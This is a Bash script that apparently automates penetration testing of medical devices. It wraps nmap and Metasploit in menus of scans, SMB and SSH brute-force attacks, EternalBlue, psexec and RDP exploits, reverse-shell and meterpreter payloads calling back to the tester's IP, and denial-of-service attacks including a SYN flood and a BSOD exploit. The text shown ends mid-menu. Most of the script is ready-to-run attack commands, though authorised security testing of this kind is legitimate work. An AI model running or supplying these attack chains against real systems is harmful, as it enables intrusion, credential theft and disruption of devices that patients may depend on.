#!/bin/bash
#
# OSSEC - Fauziah Permatasari (0566100)
# fauziah.permatasari[@]vub.be
# fauziah.permatasari[@]uni-weimar.de
#
clear
function header {
	headerASCII
	dateStamp
}
function mode {
	echo "SELECT TEST MODE"
	echo
	echo "[01] Bulk Tests"
	echo "[02] Individual Tests"
	echo
	echo -n "Enter test mode to select [e.g. 02]: "
	echo
	echo "or"
	echo "Quit [0]"
	read testMode
	modeChoice
}
function modeChoice {
	case $testMode in
		0)
			exit ;;
		01)
			clear
			bulkList ;;
		02)
			clear
			taskList ;;
		*)	
			clear
			echo "Invalid input."
			echo
			mode
	esac
}
function bulkList {
	headerASCII
	echo "BULK TESTS		"
	echo "------------------------------------------------------"
	echo "B01 - TCP Scan"
	echo "B02 - UDP Scan"
	echo "B03 - Fingerprinting / OS Scan"
	echo "B04 - SMB Scan"
	echo "B05 - SMB Enumeration"
	echo "B06 - Bruteforce Attack"
	echo "B07 - Payloads > Penetration Test > Post-Exploit"
	echo "B08 - Fuzzing"
	echo "------------------------------------------------------"
	echo -e "Enter Bulk test ID to run [e.g. B01]: "
	echo
	echo "or"
	echo "Quit [0] | Back [1]"
	read bulkID
	bulkChoice2
}
function bulkMenu {
	echo "------------------------------------------------------"
	echo -e "Enter Bulk task ID to run [e.g. B01]: "
	echo
	echo "or"
	echo "Quit [0] | Back [1]"
	read bulkID
	bulkChoice
}
function bulkChoice {
	case $bulkID in
		0)
			clear
			exit ;;
		1)
			clear
			bulkList ;;
		B01)
			clear
			b01 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Bulk-Tests/b01.txt";;
		B02)
			clear
			b02 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Bulk-Tests/b02.txt";;
		B03)
			clear
			b03 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Bulk-Tests/b03.txt";;
		B04)
			clear
			b04 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Bulk-Tests/b04.txt";;
		B05)
			clear
			b05 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Bulk-Tests/b05.txt";;
		B06)
			clear
			b06 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Bulk-Tests/b06.txt";;
		B07)
			clear
			b07 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Bulk-Tests/b07.txt";;
		B08)
			clear
			b08 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Bulk-Tests/b08.txt";;
		*)
			clear
			echo "Invalid task ID."
			echo
			echo
			bulkList
	esac
}
function bulkChoice2 {
	case $bulkID in
		0)
			exit ;;
		1)
			clear
			header
			mode ;;
		*)
			bulkChoice
	esac
}
function b01 {
	echo "B01 - TCP Scan"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "This scan will:"	
	echo "	- Gather information passively using non-authorized user role"
	echo "	- Assess possible ICS (Internet Connection Sharing) vulnerabilities"
	echo
	echo "TCP ports scanned: 7, 13, 17, 19, 20, 21, 23, 25, 42, 53, 80, 88, 102, 110, 119, 135, 139, 389, 443, 445,"
	echo "                   464, 515, 548, 554, 563, 593, 636, 647, 1024-5000, 6600, 8080, 9389, 42424, 49152-65535"
	echo
	echo -e "This set of tests will take more than 10 hours. Continue [Y/N]? "
	read yesNo
	case $yesNo in
		Y)
			echo
			echo -e "Target's IP address: "
			read targetIP
			echo
			echo "Gather information passively using non-authorized user role:"
			echo "-----------------------------------------------------------------------------------------------------------"
			nmap -T2 -sS -p7,13,17,19,20,21,23,25,42,53,80,88,102,110,119,135,139,389,443,445,464,515,548,554,563,593,636,647,1024-5000,6600,8080,9389,42424,49152-65535 --script firewall-bypass --script-args firewall-bypass.helper="ftp" $targetIP
			echo
			echo
			echo "Assess possible ICS (Internet Connection Sharing) vulnerabilities:"
			echo "-----------------------------------------------------------------------------------------------------------"
			nmap -vv -Pn -sT  --scan-delay 2s --max-parallelism 1 -ttl 255 -p20-25,80,102,137-139,443-445,502,530,593,789,1024-5000,8080,9600,19999,20000,20547,34962-34964,34980,42424,44818,46823,46824 $targetIP
			echo
			bulkMenu ;;
		N)
			clear
			echo
			bulkList ;;
		*)
			clear
			echo "Invalid input."
			echo
			echo
			b01
	esac
	echo
	echo
	##bulkMenu
}
function b02 {
	echo "B02 - UDP Scan"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "This scan will:"
	echo "	- Scan general UDP ports"
	echo "	- Assess possible ICS (Internet Connection Sharing) vulnerabilities on low-medium UDP ports"
	echo
	echo -e "This set of tests may take more than 10 hours. Continue [Y/N]? "
	read yesNo
	case $yesNo in
		Y)
			echo -e "Target's IP address: "
			read targetIP
			echo
			echo "Scan general UDP ports:"
			echo "-----------------------------------------------------------------------------------------------------------"
			nmap -T2 -sU -p7,9,13,17,19,42,53,67,69,88,123,137,138,161,162,389,464,500,1645,1646,1701,1745,1755,1801,1812,1813,1900,2460,2535,3343,3527,4500,5004,5005,49152-65535 --script firewall-bypass --script-args firewall-bypass.helper="ftp" $targetIP
			echo
			echo
			echo "Assess possible ICS (Internet Connection Sharing) vulnerabilities on low-medium UDP ports:"
			echo "-----------------------------------------------------------------------------------------------------------"
			nmap -vv -Pn -sU --scan-delay 2s --max-parallelism 1 -ttl 255 -p20-25,80,102,137-139,443-445,502,530,593,789,1024-5000,8080,9600,19999,20000,20547,34962-34964,34980,44818,46823,46824 $targetIP
			echo
			bulkMenu ;;
		N)
			clear
			echo
			bulkList ;;
		*)
			clear
			echo "Invalid input."
			echo
			echo
			b02
	esac
	echo
	echo
	##bulkMenu
}
function b03 {
	echo "B03 - Fingerprinting / OS Scan"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "This scan will:"
	echo "	- Check if device has MS12-008 and MS10-073 vulnerabilities"
	echo "	- Gather information actively using non-authorized user-role"
	echo "	- Retrieve NetBIOS name from device"
	echo
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo -e "Target's MAC address: "
	read targetMAC
	ip-mac
	echo
	echo "Check if device has MS12-008 and MS10-073 vulnerabilities:"
	echo "-----------------------------------------------------------------------------------------------------------"
	nmap -vvv -O --osscan-guess -sV $targetIP
	echo
	echo
	echo "Gather information actively using non-authorized user-role:"
	echo "-----------------------------------------------------------------------------------------------------------"
	nmap -vvv -sT --source-port 20-25,53,80,135-139,443,445,515,2103-2107,8080,49155 --data-length 40 --spoof-mac $targetMAC -Pn $targetIP
	echo
	echo
	echo "Retrieve NetBIOS name from device:"
	echo "-----------------------------------------------------------------------------------------------------------"
	service postgresql start	
	msfconsole -q -x "use auxiliary/scanner/netbios/nbname" -x "set RHOSTS $targetIP"  -x "set THREADS 11" -x "set VERBOSE true" -x "run" -x "exit"
	echo
	echo
	bulkMenu
}
function b04 {
	echo "B04 - SMB Scan"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "This scan will:"
	echo "	- List supported protocols of device's SMB server"
	echo "	- Check if device is vulnerable to MS10-096, MS10-074, MS16-075, CVE-2017-8543 & CVE-2017-8589"
	echo "	- Check SMB message signing configuration"
	echo
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo
	echo "Retrieve NetBIOS name from device:"
	echo "-----------------------------------------------------------------------------------------------------------"
	nmap -p135,137,139,445 --script smb-protocols --script-args unsafe=1 $targetIP
	echo
	echo
	echo "List supported protocols of device's SMB server:"
	echo "-----------------------------------------------------------------------------------------------------------"
	nmap --script smb-os-discovery -p135,137,139,445 $targetIP
	echo
	echo
	echo "Check SMB message signing configuration:"
	echo "-----------------------------------------------------------------------------------------------------------"
	nmap --script smb-security-mode --script-args unsafe=1 -p135-139,445 $targetIP
	echo
	echo
	bulkMenu
}
function b05 {
	echo "B05 - SMB Enumeration"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "This scan will:"
	echo "	- Enumerate Windows user accounts using SAMR"
	echo "	- Enumerate Windows user accounts using LSA"
	echo "	- Enumerate SMB sessions"
	echo "	- Enumerate SMB shares"
	echo
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo -e "Target's SMB username: "
	read smbUser
	ip-smbU
	echo
	echo "Enumerate Windows user accounts using SAMR:"
	echo "-----------------------------------------------------------------------------------------------------------"
	nmap -vv -sU -p137-139,445 --script smb-enum-users --script-args samronly=true $targetIP
	echo		
	echo
	echo "Enumerate Windows user accounts using LSA:"
	echo "-----------------------------------------------------------------------------------------------------------"
	nmap -vvvv -sU -p135,137,139,445 --script smb-enum-users --script-args lsaonly=true $targetIP
	echo
	echo
	echo "Enumerate SMB sessions:"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Enumerating SMB sessions via TCP ports . . ."
	nmap -vv -p135,137,139,445 --script smb-enum-sessions $targetIP
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	echo
	echo "Enumerating SMB sessions via UDP ports . . ."
	nmap -vv -sU -p135,137,139,445 --script smb-enum-sessions $targetIP
	echo
	echo
	echo "Enumerate SMB shares:"
	echo "-----------------------------------------------------------------------------------------------------------"
	service postgresql start	
	msfconsole -q -x "use auxiliary/scanner/smb/smb_enumshares" -x "set RHOSTS $targetIP" -x "set SMBName $smbUser" -x "set RPORT 455" -x "run" -x "exit"
	echo
	echo
	bulkMenu
}
function b06 {
	echo "B06 - Bruteforce Attack"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "This test will:"	
	echo "	- Attempt bruteforce attack through SSH client"
	echo "	- Bruteforce attack shared folders using anonymous credentials"
	echo "	- Bruteforce attack shared folders using authorized credentials"
	echo "	- Bruteforce shared users using SMB brute script"
	echo "	- Bruteforce shares using SMB brute script"
	echo "	- Bruteforce SMB login protocol"
	echo "	- Check possible remote login and execution"
	echo
	echo -e "This set of tests may take more than 10 hours. Continue [Y/N]? "
	read yesNo
	case $yesNo in
		Y)
			echo
			echo -e "Target's IP address: "
			read targetIP
			echo
			echo -e "Target's SMB username: "
			read smbUser
			echo
			echo -e "Target's SMB Domain: "
			read smbDomain
			echo
			defaultUser
			echo
			defaultPass
			ip-smbU-smbD-users-pass
			echo "-----------------------------------------------------------------------------------------------------------"
			echo
			echo "Bruteforce attack shared folders using anonymous credentials:"
			echo "-----------------------------------------------------------------------------------------------------------"
			echo "Bruteforcing shared folders via TCP ports . . ."
			echo
			nmap -vv -p137-139,445 --script smb-enum-shares $targetIP
			echo
			echo "-----------------------------------------------------------------------------------------------------------"
			echo "Bruteforcing shared folders via UDP ports . . ."
			echo 
			nmap -vv -sU -p137-139,445 --script smb-enum-shares $targetIP
			echo
			echo
			echo "Bruteforce attack shared folders using authorized credentials:"
			echo "-----------------------------------------------------------------------------------------------------------"
			echo "Bruteforcing shared folders via TCP ports . . ."
			echo
			nmap -vv -p137-139,445 --script smb-enum-shares --script-args smbuser=$smbUser $targetIP
			echo
			echo "-----------------------------------------------------------------------------------------------------------"
			echo "Bruteforcing shared folders via UDP ports"
			echo
			nmap -vv -sU -p137-139,445 --script smb-enum-shares --script-args smbuser=$smbUser $targetIP
			echo
			echo
			echo "Bruteforce shared users using SMB brute script:"
			echo "-----------------------------------------------------------------------------------------------------------"
			nmap -p135,137,139,445 --script smb-brute,smb-enum-users $targetIP
			echo
			echo
			echo "Bruteforce shares using SMB brute script:"
			echo "-----------------------------------------------------------------------------------------------------------"
			nmap -p135,137,139,445 --script smb-brute,smb-enum-shares $targetIP
			echo
			echo
			echo "Bruteforce SMB login protocol"
			echo "-----------------------------------------------------------------------------------------------------------"
			nmap -p137-139,445 --script smb-brute --script-args userdb=$userFile,passdb=$passFile $targetIP
			echo
			echo
			echo "Attempt bruteforce attack through SSH client & Check possible remote login and execution"
			echo "-----------------------------------------------------------------------------------------------------------"
			service postgresql start			
			msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login" -x "set RHOSTS $targetIP" -x "set RPORT 22" -x "set THREADS 11" -x "set BRUTEFORCE SPEED 1" -x "set STOP_ON_SUCCESS true" -x "set VERBOSE true" -x "set USER_FILE $userFile" -x "set BLANK_PASSWORDS true" -x "run" -x "set BLANK_PASSWORDS false" -x "set PASS_FILE $passFile" -x "run" -x "back" -x "use auxiliary/scanner/smb/smb_login" -x "set BLANK_PASSWORDS true" -x "set BRUTEFORCE_SPEED 3" -x "set DETECT_ANY_AUTH true" -x "set PRESERVE_DOMAINS true" -x "set RHOSTS $targetIP" -x "set RPORT 445" -x "set SMBDomain $smbDomain" -x "set SMBUser smbUser" -x "run" -x "set BLANK_PASSWORDS false" -x "set USER_AS_PASS true" -x "run" -x "set USER_AS_PASS false" -x "set USER_FILE $userFile" -x "set PASS_FILE $passFile" -x "exit"
			echo
			bulkMenu ;;
		N)
			clear
			echo
			bulkList ;;
		*)
			clear
			echo "Invalid input."
			echo
			echo
			b06 ;;
	esac
	echo
	echo
	##bulkMenu
}
function b07 {
	echo "B07 - Payloads > Penetration Test > Post-Exploit"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "This test includes:"
	echo "[Payload Setup]"
	echo "	- Set up windows/meterpreter/reverse_tcp payload"
	echo "	- Set up windows/shell_reverse_tcp payload"
	echo "	- Set up windows/x64/meterpreter_reverse_tcp payload to use for exploits"
	echo "	- Set up generic/shell_reverse_tcp payload to use for exploits"
	echo "[Penetration Test]"
	echo "	- Attempt to login to SMB by using psexec utility"
	echo "	- Check vulnerability MS15-034"
	echo "	- Check SMB vulnerability MS10-054"
	echo "	- Perform Denial of Service on SMB vulnerability MS10-054"
	echo "	- Check SMB vulnerability MS10-061"
	echo "	- Try to exploit SMB vulnerability MS10-061"
	echo "	- Check SMB vulnerability MS17-010"
	echo "	- Scan SMB vulnerability MS17-010 through auxiliary"
	echo "	- Exploit SMB vulnerability MS17-010 through auxiliary"
	echo "	- Try exploiting possible SMB vulnerability MS17-010"
	echo "	- Check RDP vulnerability MS-12-020"
	echo "	- Scan RDP vulnerability MS12-020 through auxiliary"
	echo "	- Exploit possible RDP vulnerability MS12-020"
	echo "	- Perform SYN Flood DOS attack"
	echo "[Post Exploit]"
	echo "	- Start payload handler windows/meterpreter/reverse_tcp to start a session"
	echo "	- Start payload handler windows/shell_reverse_tcp to start a session"
	echo "	- Start payload handler windows/x64/meterpreter_reverse_tcp to start a session"
	echo "	- Start payload handler generic/shell_reverse_tcp to start a session"
	echo "	- List any active sessions opened by the handlers"
	echo "	- Check if device has MS13-081 vulnerability"
	echo "	- Perform Blue Screen of Death (BSOD) exploit"
	echo "	- Check if device has MS15-004 vulnerability by performing patches enumeration"
	echo "	- Check if device has MS15-004 vulnerability by performing remote desktop service attack"
	echo "	- Check if device has MS14-060 Sandworm vulnerability"
	echo "	- Kill running jobs"	
	echo
	echo -e "This set of tests may take more than 10 hours. Continue [Y/N]? "
	read yesNo
	case $yesNo in
		Y)
			echo -e "Tester's IP address: "
			read testerIP
			echo
			echo -e "Target's IP address: "
			read targetIP
			echo
			echo -e "Target's operating system: "
			read targetOS
			echo
			echo -e "Target's SHARE file name: "
			read share
			echo
			echo -e "Target's SMB username: "
			read smbUser
			echo
			echo -e "Target's SMB Domain: "
			read smbDomain
			echo
			echo -e "Target's SMB version: "
			read smbVersion
			echo
			echo -e "Printer Share name: "
			read printerName
			ipT-ip-os-share-smbU-smbD-smbV-pshare
			echo "-----------------------------------------------------------------------------------------------------------"
			echo
			echo
			nmap --script smb-vuln-ms10-054 -p137-139,445 $targetIP
			echo
			echo
			nmap --script smb-vuln-ms10-061 --script-args unsafe=1 -p135,139,445,515,2103,2105,2107,49155 $targetIP
			echo
			echo
			nmap -vv --script smb-vuln-ms17-010 --script-args unsafe=1 -p135-139,445 $targetIP
			echo
			echo
			nmap -sT -sU -p T:3389,U:3389 --script rdp-enum-encryption $targetIP
			echo
			nmap -vv --script rdp-vuln-ms12-020 --script-args unsafe=1 -p T:3389,U:3389 $targetIP
			echo
			echo
			echo
			echo
			echo "-----------------------------------------------------------------------------------------------------------"
			service postgresql start			
			msfconsole -q -x "use payload/windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "back" -x "use payload/windows/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 80" -x "back" -x "use payload/windows/x64/meterpreter_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 2121" -x "back" -x "use payload/generic/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 20" -x "back" -x "use exploit/windows/smb/psexec" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SHARE $share" -x "set SMBDomain $smbDomain" -x "set PAYLOAD windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "exploit" -x "set SMBUser $smbUser" -x "exploit" -x "back" -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump" -x "set RHOSTS $targetIP" -x "set RPORT 445" -x "set THREADS 11" -x "set SSL true" -x "set VERBOSE true" -x "run" -x "back" -x "use auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow" -x "set CHOST $testerIP" -x "set CPORT 4444" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SMBSHARE $share" -x "set VERBOSE true" -x "exploit" -x "back" -x "use exploit/windows/smb/ms10_061_spoolss" -x "set PNAME $printerName" -x "set RHOST $targetIP" -x "set RPORT 135" -x "set SMB::Native_LM $smbVersion" -x "set SMB::Native_OS targetOS" -x "set SMBUser $smbUser" -x "set SMBDomain $smbDomain" -x "set VERBOSE true" -x "exploit" -x "set RPORT 515" -x "exploit" -x "set RPORT 2103" -x "exploit" -x "set RPORT 2105" -x "exploit" -x "set RPORT 2107" -x "exploit" -x "set RPORT 49155" -x "exploit" -x "back" -x "use auxiliary/scanner/smb/smb_ms17_010" -x "set CHECK_PIPE true" -x "set RHOSTS $targetIP" -x "run" -x "back" -x "use auxiliary/admin/smb/ms17_010_command" -x "set RHOSTS $targetIP" -x "set RPORT 445" -x "set COMMAND ADMIN" -x "set SMB::Native_LM $smbVersion" -x "set SMB::Native_OS $targetOS" -x "set SMBUser $smbUser" -x "set SMBDomain smbDomain" -x "set VERBOSE true" -x "set PAYLOAD windows/meterpreter/reverse_tcp" -x "set VERBOSE true" -x "exploit" -x "back" -x "use exploit/windows/smb/ms17_010_psexec" -x "set RHOST $targetIP" -x "set SHARE IPC$" -x "set DBGTRACE true" -x "set PAYLOAD windows/meterpreter/reverse_tcp" -x "set VERBOSE true" -x "exploit" -x "back" -x "use auxiliary/scanner/rdp/ms12_020_check" -x "set RHOSTS $targetIP" -x "set VERBOSE true" -x "run" -x "back" -x "use auxiliary/dos/windows/rdp/ms12_020_maxchannelids" -x "set RHOST $targetIP" -x "set PAYLOAD windows/meterpreter/reverse_tcp" -x "set VERBOSE true" -x "run" -x "back" -x "use auxiliary/dos/tcp/synflood" -x "set RHOST $targetIP" -x "set RPORT 80" -x "set NUM 100000" -x "run" -x "back" -x "use exploit/multi/handler" -x "set payload windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 1" -x "set VERBOSE true" -x "exploit -j" -x "back" -x "use exploit/multi/handler" -x "set payload windows/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 80" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 2" -x "set VERBOSE true" -x "exploit -j" -x "back" -x "use exploit/multi/handler" -x "set payload windows/x64/meterpreter_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 2121" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 3" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "back" -x "use exploit/multi/handler" -x "set payload generic/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 443" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 4" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "back" -x "sessions -i" -x "back" -x "use post/windows/gather/enum_patches" -x "set KB 2862335,2862330,2884256" -x "set SESSION 1" -x "run" -x "back" -x "use exploit/windows/local/ms13_081_track_popup_menu" -x "set SESSION 2" -x "exploit" -x "back" -x "use post/windows/gather/enum_patches" -x "set KB 3020388,3020387,3019978" -x "set SESSION 3" -x "run" -x "back" -x "use exploit/windows/local/ms15_004_tswbproxy" -x "set LHOST $testerIP" -x "set PAYLOAD windows/meterpreter/reverse_tcp" -x "set SESSION 4" -x "exploit" -x "back" -x "use post/windows/gather/enum_patches" -x "set KB 38000869" -x "run" -x "back" -x "kill 0,1,2,3" -x "jobs" -x "exit"
			echo
			bulkMenu;;
		N)
			clear
			echo
			bulkList ;;
		*)
			clear
			echo "Invalid input."
			echo
			echo
			b07 ;;
	esac
	echo
	echo
	##bulkMenu
}
function b08 {
	echo "B08 - Fuzzing"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo
	defaultFuzzer
	echo
	echo
	bulkMenu	
}
function taskList {
	headerASCII
	echo "INDIVIDUAL TESTS"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "001 - Ping targeted service"
	echo "002 - Gather information passively using non-authorized user role"
	echo "003 - Assess possible ICS (Internet Connection Sharing) vulnerabilities"
	echo "004 - Perform UDP scan"
	echo "005 - Assess possible ICS (Internet Connection Sharing) vulnerabilities on low-medium UDP ports"
	echo "006 - Check if device has MS12-008 and MS10-073 vulnerabilities"
	echo "007 - Gather information actively using non-authorized user-role"
	echo "008 - Retrieve NetBIOS name from device"
	echo "009 - List supported protocols of device's SMB server"
	echo "010 - Check if device is vulnerable to MS10-096, MS10-074, MS16-075, CVE-2017-8543 & CVE-2017-8589"
	echo "011 - Check SMB message signing configuration"
	echo "012 - Enumerate Windows user accounts using SAMR"
	echo "013 - Enumerate Windows user accounts using LSA"
	echo "014 - Enumerate SMB sessions"
	echo "015 - Enumerate SMB shares"
	echo "016 - Attempt bruteforce attack through SSH client"
	echo "017 - Bruteforce attack shared folders using anonymous credentials"
	echo "018 - Bruteforce attack shared folders using authorized credentials"
	echo "019 - Bruteforce shared users using SMB brute script"
	echo "020 - Bruteforce shares using SMB brute script"
	echo "021 - Bruteforce SMB login protocol"
	echo "022 - Check possible remote login and execution"
	echo "023 - Set up windows/meterpreter/reverse_tcp payload"
	echo "024 - Set up windows/shell_reverse_tcp payload"
	echo "025 - Set up windows/x64/meterpreter_reverse_tcp payload to use for exploits"
	echo "026 - Set up generic/shell_reverse_tcp payload to use for exploits"
	echo "027 - Attempt to login to SMB by using psexec utility"
	echo "028 - Check vulnerability MS15-034"
	echo "029 - Check SMB vulnerability MS10-054"
	echo "030 - Perform Denial of Service on SMB vulnerability MS10-054"
	echo "031 - Check SMB vulnerability MS10-061"
	echo "032 - Try to exploit SMB vulnerability MS10-061"
	echo "033 - Check SMB vulnerability MS17-010"
	echo "034 - Scan SMB vulnerability MS17-010 through auxiliary"
	echo "035 - Exploit SMB vulnerability MS17-010 through auxiliary"
	echo "036 - Try exploiting possible SMB vulnerability MS17-010"
	echo "037 - Check RDP vulnerability MS-12-020"
	echo "038 - Scan RDP vulnerability MS12-020 through auxiliary"
	echo "039 - Exploit possible RDP vulnerability MS12-020"
	echo "040 - Perform SYN Flood DOS attack"
	echo "041 - Start payload handler windows/meterpreter/reverse_tcp to start a session"
	echo "042 - Start payload handler windows/shell_reverse_tcp to start a session"
	echo "043 - Start payload handler windows/x64/meterpreter_reverse_tcp to start a session"
	echo "044 - Start payload handler generic/shell_reverse_tcp to start a session"
	echo "045 - List any active sessions opened by the handlers"
	echo "046 - Check if device has MS13-081 vulnerability"
	echo "047 - Perform Blue Screen of Death (BSOD) exploit"
	echo "048 - Check if device has MS15-004 vulnerability by performing patches enumeration"
	echo "049 - Check if device has MS15-004 vulnerability by performing remote desktop service attack"
	echo "050 - Check if device has MS14-060 Sandworm vulnerability"
	echo "051 - Kill running jobs"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -n "Enter task ID to run [e.g. 002]: "
	echo
	echo "or"
	echo "Quit [0] | Back [1]"
	read taskID
	taskChoice2
}
function taskMenu {
	echo -n "Enter task ID to run [e.g. 002]: "
	echo
	echo "or"
	echo "Quit [0] | Back [1]"
	read taskID
	taskChoice
}
function taskChoice {
	case $taskID in
		0)
			exit ;;
		1)
			clear
			taskList ;;
		001)
			clear
			t001 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/001.txt" ;;
		002)
			clear
			t002 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/002.txt" ;;
		003)
			clear
			t003 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/003.txt" ;;
		004)
			clear
			t004 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/004.txt" ;;
		005)
			clear
			t005 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/005.txt" ;;
		006)
			clear
			t006 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/006.txt" ;;
		007)
			clear
			t007 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/007.txt" ;;
		008)
			clear
			t008 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/008.txt" ;;
		009)
			clear
			t009 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/009.txt" ;;
		010)
			clear
			t010 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/010.txt" ;;
		011)
			clear
			t011 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/011.txt" ;;
		012)
			clear
			t012 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/012.txt" ;;
		013)
			clear
			t013 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/013.txt" ;;
		014)
			clear
			t014 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/014.txt" ;;
		015)
			clear
			t015 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/015.txt" ;;
		016)
			clear
			t016 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/016.txt" ;;
		017)
			clear
			t017 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/017.txt" ;;
		018)
			clear
			t018 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/018.txt" ;;
		019)
			clear
			t019 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/019.txt" ;;
		020)
			clear
			t020 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/020.txt" ;;
		021)
			clear
			t021 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/021.txt" ;;
		022)
			clear
			t022 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/022.txt" ;;
		023)
			clear
			t023 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/023.txt" ;;
		024)
			clear
			t024 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/024.txt" ;;
		025)
			clear
			t025 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/025.txt" ;;
		026)
			clear
			t026 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/026.txt" ;;
		027)
			clear
			t027 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/027.txt" ;;
		028)
			clear
			t028 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/028.txt" ;;
		029)
			clear
			t029 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/029.txt" ;;
		030)
			clear
			t030 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/030.txt" ;;
		031)
			clear
			t031 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/031.txt" ;;
		032)
			clear
			t032 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/032.txt" ;;
		033)
			clear
			t033 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/033.txt" ;;
		034)
			clear
			t034 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/034.txt" ;;
		035)
			clear
			t035 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/035.txt" ;;
		036)
			clear
			t036 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/036.txt" ;;
		037)
			clear
			t037 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/037.txt" ;;
		038)
			clear
			t038 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/038.txt" ;;
		039)
			clear
			t039 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/039.txt" ;;
		040)
			clear
			t040 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/040.txt" ;;
		041)
			clear
			t041 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/041.txt" ;;
		042)
			clear
			t042 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/042.txt" ;;
		043)
			clear
			t043 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/043.txt" ;;
		044)
			clear
			t044 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/044.txt" ;;
		045)
			clear
			t045 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/045.txt" ;;
		046)
			clear
			t046 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/046.txt" ;;
		047)
			clear
			t047 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/047.txt" ;;
		048)
			clear
			t048 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/048.txt" ;;
		049)
			clear
			t049 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/049.txt" ;;
		050)
			clear
